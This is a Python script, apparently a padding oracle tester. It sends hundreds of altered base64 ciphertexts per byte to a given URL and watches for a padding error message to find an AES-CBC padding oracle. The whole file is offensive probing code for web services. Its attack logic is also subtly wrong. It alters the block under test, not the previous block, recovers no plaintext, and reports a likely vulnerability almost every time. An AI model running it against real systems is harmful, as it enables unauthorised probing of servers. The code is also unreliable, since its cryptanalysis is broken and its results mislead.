import argparse
import logging
import requests
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
import os
import base64

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


def setup_argparse():
    """
    Sets up the argument parser for the command-line interface.
    """
    parser = argparse.ArgumentParser(description="Padding Oracle Tester for CBC mode encryption.")
    parser.add_argument("-u", "--url", required=True, help="The URL to test for the padding oracle vulnerability.")
    parser.add_argument("-d", "--data", required=False, help="Data to be encrypted (optional). If not provided, a default message is used.")
    parser.add_argument("-c", "--ciphertext", required=False, help="Base64 encoded ciphertext to decrypt (optional).  If not provided, data will be encrypted first.")
    parser.add_argument("-k", "--key", required=False, help="Hex encoded Key for CBC decryption (optional, needs to be 16, 24 or 32 bytes long). If not provided, a random key will be generated.")
    parser.add_argument("-iv", "--iv", required=False, help="Hex encoded initialization vector (IV) for CBC (optional, needs to be 16 bytes long). If not provided, a random IV will be generated.")
    parser.add_argument("-p", "--parameter", default="ciphertext", help="The parameter name in the URL to inject the ciphertext (default: ciphertext).")
    parser.add_argument("-e", "--error_message", default="PaddingException", help="Error message indicative of padding errors on the server side. (default: PaddingException)")
    parser.add_argument("--block_size", type=int, default=16, help="Block size in bytes.  Usually 16 bytes (AES). (default: 16)")
    parser.add_argument("--get", action='store_true', help="Use GET request instead of POST.")
    parser.add_argument("--test_mode", action='store_true', help="Enable test mode to not send any requests to the server")

    return parser.parse_args()


def generate_random_key(key_size=16):
    """
    Generates a random key of the specified size.
    :param key_size: The size of the key in bytes (16, 24, or 32 for AES-128, AES-192, or AES-256, respectively).
    :return: A random key as bytes.
    """
    if key_size not in [16, 24, 32]:
        raise ValueError("Key size must be 16, 24, or 32 bytes.")
    return os.urandom(key_size)


def generate_random_iv(block_size=16):
    """
    Generates a random initialization vector (IV) of the specified size.
    :param block_size: The block size in bytes (usually 16 for AES).
    :return: A random IV as bytes.
    """
    return os.urandom(block_size)


def cbc_encrypt(data, key, iv):
    """
    Encrypts the data using CBC mode encryption.

    Args:
        data (bytes): The data to encrypt.
        key (bytes): The encryption key.
        iv (bytes): The initialization vector.

    Returns:
        bytes: The encrypted ciphertext.
    """
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()

    return ciphertext

def test_padding_oracle(url, ciphertext, parameter, error_message, block_size, use_get, test_mode):
    """
    Tests a web server for padding oracle vulnerability.

    Args:
        url (str): The URL to test.
        ciphertext (bytes): The ciphertext to send.
        parameter (str): The parameter name for the ciphertext.
        error_message (str): The error message indicative of padding errors.
        block_size (int): The block size in bytes.
        use_get (bool): Use GET instead of POST
        test_mode (bool): Enable test mode to not send requests to server.

    Returns:
        bool: True if a vulnerability is found, False otherwise.
    """
    num_blocks = len(ciphertext) // block_size
    if len(ciphertext) % block_size != 0:
        logging.error("Ciphertext length is not a multiple of the block size.")
        return False

    for block_num in range(num_blocks - 1, 0, -1): # Iterate from the second last to the second block
        block_start = block_num * block_size
        block_end = (block_num + 1) * block_size
        current_block = ciphertext[block_start:block_end]

        for byte_index in range(block_size - 1, -1, -1):
            padding_value = block_size - byte_index
            modified_block = bytearray(current_block)
            
            for byte_value in range(256):
                modified_block[byte_index] = byte_value
                modified_ciphertext = ciphertext[:block_start] + bytes(modified_block) + ciphertext[block_end:]
                encoded_ciphertext = base64.b64encode(modified_ciphertext).decode('utf-8')

                if test_mode:
                    logging.info(f"Testing block {block_num}, byte {byte_index}, value {byte_value}: Test Mode Enabled")
                    continue

                try:
                    if use_get:
                        response = requests.get(url, params={parameter: encoded_ciphertext}, timeout=5)
                    else:
                        response = requests.post(url, data={parameter: encoded_ciphertext}, timeout=5)
                    response.raise_for_status()  # Raise HTTPError for bad responses (4xx or 5xx)

                    if error_message in response.text:
                        logging.debug(f"Block: {block_num}, Byte: {byte_index}, Value: {byte_value}, Result: Padding Error")
                    else:
                        logging.info(f"Block: {block_num}, Byte: {byte_index}, Value: {byte_value}, Result: Success - Potential Padding Oracle")
                        # Correct byte found, update current_block with correct padding
                        current_block = bytearray(current_block)
                        current_block[byte_index] = byte_value
                        current_block = bytes(current_block)
                        break  # Move to next byte
                except requests.exceptions.RequestException as e:
                    logging.error(f"Request failed: {e}")
                    return False
            else:
                logging.warning(f"No valid byte found for Block: {block_num}, Byte: {byte_index}.  Possible false positive.")

    return True


def main():
    """
    Main function to execute the padding oracle tester.
    """
    args = setup_argparse()

    url = args.url
    data = args.data
    ciphertext_base64 = args.ciphertext
    parameter = args.parameter
    error_message = args.error_message
    block_size = args.block_size
    use_get = args.get
    test_mode = args.test_mode

    # Key and IV Handling
    if args.key:
        try:
            key = bytes.fromhex(args.key)
            if len(key) not in [16, 24, 32]:
                raise ValueError("Key length must be 16, 24, or 32 bytes (AES-128, AES-192, AES-256).")
        except ValueError:
            logging.error("Invalid key. Key must be a hex encoded string of length 32, 48, or 64 (16, 24, or 32 bytes).")
            return
    else:
        key = generate_random_key()
        logging.info(f"Generated random key (hex encoded): {key.hex()}")

    if args.iv:
        try:
            iv = bytes.fromhex(args.iv)
            if len(iv) != block_size:
                raise ValueError(f"IV length must be {block_size} bytes.")
        except ValueError:
            logging.error(f"Invalid IV. IV must be a hex encoded string of length {block_size * 2} ({block_size} bytes).")
            return
    else:
        iv = generate_random_iv(block_size)
        logging.info(f"Generated random IV (hex encoded): {iv.hex()}")

    # Ciphertext generation or retrieval
    if ciphertext_base64:
        try:
            ciphertext = base64.b64decode(ciphertext_base64)
        except ValueError:
            logging.error("Invalid ciphertext. Ciphertext must be a valid base64 encoded string.")
            return
    else:
        if not data:
            data = "This is a test message."  # Default message if none is provided
        data_bytes = data.encode('utf-8')
        ciphertext = cbc_encrypt(data_bytes, key, iv)
        ciphertext_base64 = base64.b64encode(ciphertext).decode('utf-8')
        logging.info(f"Encrypted ciphertext (base64 encoded): {ciphertext_base64}")

    # Input Validation
    if not url:
        logging.error("URL is required.")
        return

    if block_size <= 0:
        logging.error("Block size must be a positive integer.")
        return

    if not isinstance(error_message, str):
        logging.error("Error message must be a string.")
        return

    # Run padding oracle test
    if test_padding_oracle(url, ciphertext, parameter, error_message, block_size, use_get, test_mode):
        logging.info("Padding oracle vulnerability likely found.")
    else:
        logging.info("Padding oracle vulnerability not detected, or an error occurred.")


if __name__ == "__main__":
    main()